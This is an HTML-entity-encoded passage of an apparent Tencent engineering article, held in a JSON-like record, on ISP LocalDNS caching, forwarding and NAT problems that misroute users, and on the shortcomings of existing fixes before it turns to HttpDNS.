AF;&#x7684;&#x4E1A;&#x52A1;&#x5E26;&#x6765;&#x4E86;&#x5DE8;&#x5927;&#x7684;&#x635F;&#x5931;&#x3002;&#x4E3A;&#x6B64;&#x817E;&#x8BAF;&#x5EFA;&#x7ACB;&#x4E86;&#x4E13;&#x4E1A;&#x7684;&#x56E2;&#x961F;&#x4E0E;&#x5404;&#x4E2A;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x4E86;&#x6DF1;&#x5EA6;&#x6C9F;&#x901A;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5404;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x5904;&#x7406;&#x6548;&#x7387;&#x53CA;&#x6548;&#x679C;&#x5747;&#x4E0D;&#x80FD;&#x8FBE;&#x5230;&#x817E;&#x8BAF;&#x5404;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9700;&#x6C42;&#x3002;&#x9664;&#x4E86;&#x548C;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x6C9F;&#x901A;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x6280;&#x672F;&#x4E0A;&#x7684;&#x65B9;&#x6848;&#xFF0C;&#x80FD;&#x4ECE;&#x6839;&#x6E90;&#x4E0A;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8DE8;&#x7F51;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F; &#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;&#x8981;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5148;&#x5F97;&#x4E86;&#x89E3;&#x4E0B;&#x73B0;&#x5728;&#x56FD;&#x5185;&#x5404;ISP&#x7684;LocalDNS&#x7684;&#x57FA;&#x672C;&#x60C5;&#x51B5;&#x3002;&#x56FD;&#x5185;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x9020;&#x6210;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x53EF;&#x4EE5;&#x5F52;&#x4E3A;&#x4E0B;&#x4E09;&#x7C7B;&#xFF1A; 1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x5F88;&#x597D;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;LocalDNS&#x7F13;&#x5B58;&#x4E86;&#x817E;&#x8BAF;&#x7684;&#x57DF;&#x540D;&#x7684;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x5411;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x53D1;&#x8D77;&#x9012;&#x5F52;&#xFF0C;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A; &#x4E3A;&#x4F55;LocalDNS&#x8981;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5462;&#xFF1F;&#x539F;&#x56E0;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#xFF1A; &#xFF08;1&#xFF09;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x6D41;&#x91CF;&#x5728;&#x672C;&#x7F51;&#x5185;&#x6D88;&#x5316;&#xFF1A;&#x56FD;&#x5185;&#x7684;&#x5404;&#x4E92;&#x8054;&#x7F51;&#x63A5;&#x5165;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x5E26;&#x5BBD;&#x8D44;&#x6E90;&#x3001;&#x7F51;&#x95F4;&#x7ED3;&#x7B97;&#x8D39;&#x7528;&#x3001;IDC&#x673A;&#x623F;&#x5206;&#x5E03;&#x3001;&#x7F51;&#x5185;ICP&#x8D44;&#x6E90;&#x5206;&#x5E03;&#x7B49;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x5DEE;&#x5F02;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x7F51;&#x5185;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x8D28;&#x91CF;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x5C11;&#x8DE8;&#x7F51;&#x7ED3;&#x7B97;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x5728;&#x7F51;&#x5185;&#x642D;&#x5EFA;&#x4E86;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x901A;&#x8FC7;&#x628A;&#x57DF;&#x540D;&#x5F3A;&#x884C;&#x6307;&#x5411;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x628A;&#x672C;&#x5730;&#x672C;&#x7F51;&#x6D41;&#x91CF;&#x5B8C;&#x5168;&#x7559;&#x5728;&#x4E86;&#x672C;&#x5730;&#x7684;&#x76EE;&#x7684;&#x3002;","keywords":null,"text":"&#x4F46;&#x51E1;&#x4F7F;&#x7528;&#x57DF;&#x540D;&#x6765;&#x7ED9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF0C;&#x90FD;&#x6216;&#x591A;&#x6216;&#x5C11;&#x5730;&#x65E0;&#x6CD5;&#x907F;&#x514D;&#x5728;&#x6709;&#x4E2D;&#x56FD;&#x7279;&#x8272;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E2D;&#x906D;&#x9047;&#x5230;&#x5404;&#x79CD;&#x57DF;&#x540D;&#x88AB;&#x7F13;&#x5B58;&#x3001;&#x7528;&#x6237;&#x8DE8;&#x7F51;&#x8BBF;&#x95EE;&#x7F13;&#x6162;&#x7B49;&#x95EE;&#x9898;&#x3002;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x6837;&#x7684;&#x57DF;&#x540D;&#x6570;&#x91CF;&#x5728;10&#x4E07;&#x7EA7;&#x522B;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x6765;&#x8BB2;&#xFF0C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x5230;&#x5E95;&#x6709;&#x591A;&#x4E25;&#x91CD;&#x5462;&#xFF1F;&#x6BCF;&#x5929;&#x817E;&#x8BAF;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x76D1;&#x6D4B;&#x7CFB;&#x7EDF;&#x5728;&#x4E0D;&#x505C;&#x5730;&#x5BF9;&#x5168;&#x56FD;&#x6240;&#x6709;&#x7684;&#x91CD;&#x70B9;LocalDNS&#x8FDB;&#x884C;&#x63A2;&#x6D4B;&#xFF0C;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x5728;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x65E5;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x91CF;&#x662F;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E86;80&#x4E07;&#x6761;&#x3002;&#x8FD9;&#x7ED9;&#x817E;&#x8BAF;&#x7684;&#x4E1A;&#x52A1;&#x5E26;&#x6765;&#x4E86;&#x5DE8;&#x5927;&#x7684;&#x635F;&#x5931;&#x3002;&#x4E3A;&#x6B64;&#x817E;&#x8BAF;&#x5EFA;&#x7ACB;&#x4E86;&#x4E13;&#x4E1A;&#x7684;&#x56E2;&#x961F;&#x4E0E;&#x5404;&#x4E2A;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x4E86;&#x6DF1;&#x5EA6;&#x6C9F;&#x901A;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5404;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x5904;&#x7406;&#x6548;&#x7387;&#x53CA;&#x6548;&#x679C;&#x5747;&#x4E0D;&#x80FD;&#x8FBE;&#x5230;&#x817E;&#x8BAF;&#x5404;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9700;&#x6C42;&#x3002;&#x9664;&#x4E86;&#x548C;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x6C9F;&#x901A;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x6280;&#x672F;&#x4E0A;&#x7684;&#x65B9;&#x6848;&#xFF0C;&#x80FD;&#x4ECE;&#x6839;&#x6E90;&#x4E0A;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8DE8;&#x7F51;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F; &#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;&#x8981;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5148;&#x5F97;&#x4E86;&#x89E3;&#x4E0B;&#x73B0;&#x5728;&#x56FD;&#x5185;&#x5404;ISP&#x7684;LocalDNS&#x7684;&#x57FA;&#x672C;&#x60C5;&#x51B5;&#x3002;&#x56FD;&#x5185;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x9020;&#x6210;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x53EF;&#x4EE5;&#x5F52;&#x4E3A;&#x4E0B;&#x4E09;&#x7C7B;&#xFF1A; 1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x5F88;&#x597D;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;LocalDNS&#x7F13;&#x5B58;&#x4E86;&#x817E;&#x8BAF;&#x7684;&#x57DF;&#x540D;&#x7684;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x5411;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x53D1;&#x8D77;&#x9012;&#x5F52;&#xFF0C;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A; &#x4E3A;&#x4F55;LocalDNS&#x8981;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5462;&#xFF1F;&#x539F;&#x56E0;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#xFF1A; &#xFF08;1&#xFF09;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x6D41;&#x91CF;&#x5728;&#x672C;&#x7F51;&#x5185;&#x6D88;&#x5316;&#xFF1A;&#x56FD;&#x5185;&#x7684;&#x5404;&#x4E92;&#x8054;&#x7F51;&#x63A5;&#x5165;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x5E26;&#x5BBD;&#x8D44;&#x6E90;&#x3001;&#x7F51;&#x95F4;&#x7ED3;&#x7B97;&#x8D39;&#x7528;&#x3001;IDC&#x673A;&#x623F;&#x5206;&#x5E03;&#x3001;&#x7F51;&#x5185;ICP&#x8D44;&#x6E90;&#x5206;&#x5E03;&#x7B49;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x5DEE;&#x5F02;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x7F51;&#x5185;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x8D28;&#x91CF;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x5C11;&#x8DE8;&#x7F51;&#x7ED3;&#x7B97;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x5728;&#x7F51;&#x5185;&#x642D;&#x5EFA;&#x4E86;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x901A;&#x8FC7;&#x628A;&#x57DF;&#x540D;&#x5F3A;&#x884C;&#x6307;&#x5411;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x628A;&#x672C;&#x5730;&#x672C;&#x7F51;&#x6D41;&#x91CF;&#x5B8C;&#x5168;&#x7559;&#x5728;&#x4E86;&#x672C;&#x5730;&#x7684;&#x76EE;&#x7684;&#x3002; &#xFF08;2&#xFF09;&#x63A8;&#x9001;&#x5E7F;&#x544A;&#xFF1A;&#x6709;&#x90E8;&#x5206;LocalDNS&#x4F1A;&#x628A;&#x90E8;&#x5206;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x7684;&#x6240;&#x6307;&#x5411;&#x7684;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x66FF;&#x6362;&#x6210;&#x7B2C;&#x4E09;&#x65B9;&#x5E7F;&#x544A;&#x8054;&#x76DF;&#x7684;&#x5E7F;&#x544A;&#x3002; &#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x884C;&#x4E3A;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF0C;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x4F1A;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x4EA7;&#x751F;&#x4EE5;&#x4E0B;&#x7684;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#xFF1A; A&#x3001;&#x4EC5;&#x5BF9;80&#x7AEF;&#x53E3;&#x7684;http&#x670D;&#x52A1;&#x505A;&#x4E86;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x57DF;&#x540D;&#x662F;&#x901A;&#x8FC7;https&#x534F;&#x8BAE;&#x6216;&#x5176;&#x5B83;&#x7AEF;&#x53E3;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x5931;&#x8D25;&#x3002;&#x6BD4;&#x5982;&#x652F;&#x4ED8;&#x670D;&#x52A1;&#x3001;&#x6E38;&#x620F;&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x8FDE;&#x63A5;connect server&#x670D;&#x52A1;&#x7B49;&#x3002; B&#x3001;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD0;&#x7EF4;&#x6C34;&#x5E73;&#x53C2;&#x5DEE;&#x4E0D;&#x9F50;&#xFF0C;&#x65F6;&#x6709;&#x51FA;&#x73B0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x6545;&#x969C;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#x3002; 2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;&#x9664;&#x4E86;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x4EE5;&#x5916;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x8FD8;&#x5B58;&#x5728;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#x662F;&#x6307;&#x8FD0;&#x8425;&#x5546;&#x81EA;&#x8EAB;&#x4E0D;&#x8FDB;&#x884C;&#x57DF;&#x540D;&#x9012;&#x5F52;&#x89E3;&#x6790;&#xFF0C;&#x800C;&#x662F;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x9012;&#x5F52;DNS&#x4E0A;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x6B63;&#x5E38;&#x7684;LocalDNS&#x9012;&#x5F52;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A; &#x800C;&#x90E8;&#x5206;&#x5C0F;&#x8FD0;&#x8425;&#x5546;&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x8D44;&#x6E90;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x5C06;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x7684;&#x9012;&#x5F52;LocalDNS&#x4E0A;&#x53BB;&#x4E86;&#xFF1A; &#x8FD9;&#x6837;&#x7684;&#x76F4;&#x63A5;&#x540E;&#x679C;&#x5C31;&#x662F;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x6536;&#x5230;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x7684;&#x6765;&#x6E90;IP&#x5C31;&#x6210;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;IP&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x6D41;&#x91CF;&#x88AB;&#x5BFC;&#x5411;&#x4E86;&#x9519;&#x8BEF;&#x7684;IDC&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x53D8;&#x6162;&#x3002; 3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#x6307;&#x7684;&#x662F;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x6309;&#x7167;&#x6807;&#x51C6;&#x7684;DNS&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x5B58;&#x5728;&#x591A;&#x51FA;&#x53E3;&#x4E14;&#x914D;&#x7F6E;&#x4E86;&#x76EE;&#x6807;&#x8DEF;&#x7531;NAT&#xFF0C;&#x7ED3;&#x679C;&#x5BFC;&#x81F4;LocalDNS&#x6700;&#x7EC8;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x7684;&#x51FA;&#x53E3;IP&#x5C31;&#x6709;&#x6982;&#x7387;&#x4E0D;&#x4E3A;&#x672C;&#x7F51;&#x7684;IP&#x5730;&#x5740;&#xFF1A; &#x8FD9;&#x6837;&#x7684;&#x76F4;&#x63A5;&#x540E;&#x679C;&#x5C31;&#x662F;GSLB DNS&#x6536;&#x5230;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x7684;&#x6765;&#x6E90;IP&#x8FD8;&#x662F;&#x6210;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;IP&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x6D41;&#x91CF;&#x88AB;&#x5BFC;&#x5411;&#x4E86;&#x9519;&#x8BEF;&#x7684;IDC&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x53D8;&#x6162;&#x3002; &#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x89E3;&#x6790;&#x57DF;&#x540D;&#x5F02;&#x5E38;&#xFF0C;&#x7ED9;&#x5BF9;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x817E;&#x8BAF;&#x4E1A;&#x52A1;&#x7684;&#x4F53;&#x9A8C;&#x9020;&#x6210;&#x4E86;&#x975E;&#x5E38;&#x5927;&#x7684;&#x635F;&#x5BB3;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#x7684;&#x5462;&#xFF1F; 1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;+&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x662F;&#x76EE;&#x524D;&#x817E;&#x8BAF;&#x7684;&#x8FD0;&#x8425;&#x56E2;&#x961F;&#x4E00;&#x76F4;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6848;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x5C31;&#x662F;&#x5468;&#x671F;&#x6BD4;&#x8F83;&#x957F;&#xFF0C;&#x6BD5;&#x7ADF;&#x901A;&#x8FC7;&#x884C;&#x653F;&#x624B;&#x6BB5;&#x6765;&#x63A8;&#x52A8;&#x8FD0;&#x8425;&#x5546;&#x6765;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x7684;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x5927;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF0C;&#x5F97;&#x51FA;&#x7684;&#x7ED3;&#x8BBA;&#x662F;Top 3&#x7684;&#x95EE;&#x9898;&#x7528;&#x6237;&#x5747;&#x4E3A;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x7528;&#x6237;&#x3002;&#x5BF9;&#x4E8E;&#x8FD9;&#x90E8;&#x5206;&#x7528;&#x6237;&#xFF0C;&#x6211;&#x4EEC;&#x6709;&#x4EC0;&#x4E48;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x4EE5;&#x4E0A;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F; 2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google public DNS&#xFF1A;&#x8FD9;&#x4E2A;&#x65B9;&#x6848;&#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x7F8E;&#x597D;&#xFF0C;114dns&#x662F;&#x56FD;&#x5185;&#x6700;&#x5927;&#x7684;&#x4E2D;&#x7ACB;&#x7F13;&#x5B58;DNS&#xFF0C;&#x800C;Google&#x53C8;&#x662F;&#x79C9;&#x627F;&#x4E0D;&#x4F5C;&#x6076;&#x7406;&#x5FF5;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x5DE5;&#x7A0B;&#x5E1D;&#x56FD;&#x5DE8;&#x9CC4;&#xFF0C;&#x800C;&#x4E14;&#x817E;&#x8BAF;&#x7684;&#x6743;&#x5A01;DNS&#x53C8;&#x652F;&#x6301;edns-client-subnet&#x529F;&#x80FD;&#xFF0C;&#x80FD;&#x76F4;&#x63A5;&#x8BC6;&#x522B;&#x4F7F;&#x7528;Google publicDNS&#x89E3;&#x6790;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x7684;&#x7528;&#x6237;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x5931;&#x6548;&#x3002;&#x4F46;&#x662F;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A; &#xFF08;1&#xFF09;&#x5982;&#x4F55;&#x5728;&#x7528;&#x6237;&#x4FA7;&#x6784;&#x9020;&#x57DF;&#x540D;&#x8BF7;&#x6C42;&#xFF1A;&#x5BF9;&#x4E8E;PC&#x7AEF;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6765;&#x8BF4;&#xFF0C;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;DNS&#x8BF7;&#x6C42;&#x5305;&#x5E76;&#x4E0D;&#x7B97;&#x4EC0;&#x4E48;&#x96BE;&#x4E8B;&#x3002;&#x4F46;&#x5728;&#x79FB;&#x52A8;&#x7AEF;&#x8981;&#x5411;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;LocalDNS&#x4E0A;&#x53D1;&#x9001;&#x6807;&#x51C6;&#x7684;DNS&#x8BF7;&#x6C42;&#x5305;&#xFF0C;&#x800C;&#x4E14;&#x8981;&#x517C;&#x5BB9;&#x5404;&#x79CD;iOS&#x548C;Android&#x7684;&#x7248;&#x672C;&#x7684;&#x8BDD;&#xFF0C;&#x6280;&#x672F;&#x4E0A;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x517C;&#x5BB9;&#x7684;&#x6210;&#x672C;&#x4F1A;&#x5F88;&#x9AD8;&#x3002; &#xFF08;2&#xFF09;&#x63A8;&#x52A8;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6781;&#x9AD8;&#xFF1A;&#x5982;&#x679C;&#x8981;&#x63A8;&#x52A8;&#x7528;&#x6237;&#x624B;&#x52A8;&#x4FEE;&#x6539;PC&#x7684;DNS&#x914D;&#x7F6E;&#x7684;&#x8BDD;&#xFF0C;&#x5728;PC&#x7AEF;&#x548C;&#x624B;&#x673A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;WiFI&#x4E0B;&#x9762;&#x8FD8;&#x7B97;&#x52C9;&#x5F3A;&#x53EF;&#x884C;&#x3002;&#x4F46;&#x662F;&#x8981;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x5728;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E0B;&#x7684;DNS&#x914D;&#x7F6E;&#xFF0C;&#x5176;&#x96BE;&#x5EA6;&#x4E0D;&#x8A00;&#x800C;&#x55BB;&#x3002; 3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;&#x5982;&#x679C;&#x8981;&#x91C7;&#x7528;&#x8FD9;&#x79CD;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x8BDD;&#xFF0C;&#x9996;&#x5148;&#x4F60;&#x5C31;&#x5F97;&#x8981;&#x62FF;&#x5230;&#x4E00;&#x4EFD;&#x51C6;&#x786E;&#x7684;IP&#x5730;&#x5740;&#x5E93;&#x6765;&#x5224;&#x65AD;&#x7528;&#x6237;&#x7684;&#x5F52;&#x5C5E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5236;&#x5B9A;&#x4E2A;&#x534F;&#x8BAE;&#x642D;&#x4E2A;connect center&#x6765;&#x505A;&#x8C03;&#x5EA6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x63A5;&#x5165;&#x5C42;&#x505A;&#x8C03;&#x5EA6;&#x6539;&#x9020;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x548C;2&#x79CD;&#x65B9;&#x6848;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x662F;&#x4E0D;&#x80FD;&#x505A;&#xFF0C;&#x53EA;&#x662F;&#x6210;&#x672C;&#x4F1A;&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x5C24;&#x5176;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x79CD;&#x4E1A;&#x52A1;&#x89C4;&#x6A21;&#x5982;&#x6B64;&#x5E9E;&#x5927;&#x7684;&#x516C;&#x53F8;&#x800C;&#x8A00;&#x3002; &#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;&#x65E2;&#x7136;&#x4E0A;&#x9762;&#x7684;&#x65B9;&#x6848;&#x90FD;&#x5B58;&#x5728;&#x90A3;&#x4E48;&#x591A;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x90A3;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x8C03;&#x5EA6;&#x7CBE;&#x51C6;&#x3001;&#x6210;&#x672C;&#x4F4E;&#x5EC9;&#x3001;&#x914D;&#x7F6E;&#x65B9;&#x4FBF;&#x7684;&#x57FA;&#x4E8E;&#x57DF;&#x540D;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x5462;&#xFF1F;&#x7B54;&#x6848;&#x662F;&#x80AF;&#x5B9A;&#x7684;&#x3002;&#x817E;&#x8BAF;&#x516C;&#x53F8;&#x7684;GSLB 